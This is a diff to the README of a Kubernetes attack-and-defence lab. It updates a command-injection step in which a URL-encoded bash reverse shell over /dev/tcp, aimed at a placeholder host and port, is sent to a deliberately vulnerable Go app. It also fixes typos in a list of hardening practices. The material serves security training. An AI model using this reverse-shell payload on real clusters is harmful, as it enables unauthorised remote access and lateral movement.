@@ -46,7 +46,7 @@ cd go-rce-kubernetes && docker build .
 4. Exploit 
  - The go-rce applicaion takes untrusted data from users as command line arguments and redirect
  - Open a browser to the following link (Replace hostname and port with the external IP/port of the kubernetes service) <br>
- [http://hostname:port/google.com?bash%20-i%20%26%3E%20%2Fdev%2Ftcp%2F10.11.11.39%2F8444%200%3E%261](http://hostname:port/google.com?bash%20-i%20%26%3E%20%2Fdev%2Ftcp%2F10.11.11.39%2F8444%200%3E%261)
+ [http://hostname:port/google.com?bash%20-i%20%26%3E%20%2Fdev%2Ftcp%2Fhostname9%2Fport%200%3E%261](http://hostname:port/google.com?bash%20-i%20%26%3E%20%2Fdev%2Ftcp%2Fhostname%2Fport%200%3E%261)
 
 5. Recon
  - what information can you find that might be useful for lateral movement and/or persistence in the cluster? 
@@ -116,19 +116,19 @@ This section introduces some general best practice guildlines for operating secu
 
 ### Build secure images 
     - Use slim and minimal base images, where possible 
-    - Use multi-stage builds to avoid adding unnessisary binaries, libraries, files, etc. 
-    - Scan images and applications for secuirty vulernabilities 
+    - Use multi-stage builds to avoid adding unnecessary binaries, libraries, files, etc. 
+    - Scan images and applications for security vulnerabilities
 
 ### Ensure binary authorization
     - Restrict access to container registries and use only verified images (ie. Cryptographically signed images, OPA policies, etc. )
 
-### Remove unnessisary capabilities 
+### Remove unnecessary capabilities 
     - Ensure securityContext is applied to ensure pods are running as non-root, with appropriate capabilities and read-only filesystems where possible.  
 
-### Apply least privledge access 
+### Apply least privilege access 
     - Apply RBAC policy and limit access to service accounts 
 
-### Take caution with senstive mount points
+### Take caution with sensitive mount points
     - Avoid mounting service account tokens and 'hostpath', especially for pods that are exposed to lower environments (ie. internet facing, accessible form uat, dev, etc..)
 
 ### Segment, Segment and Segment 
@@ -155,3 +155,4 @@ https://github.com/cyberark/KubiScan<br>
 https://kubernetes.io/blog/2018/07/18/11-ways-not-to-get-hacked/<br>
 https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/<br>
 https://github.com/trailofbits/audit-kubernetes/tree/master/reports<br>
+https://blog.aquasec.com/container-vulnerability-dzmlt-dynamic-container-analysis<br>
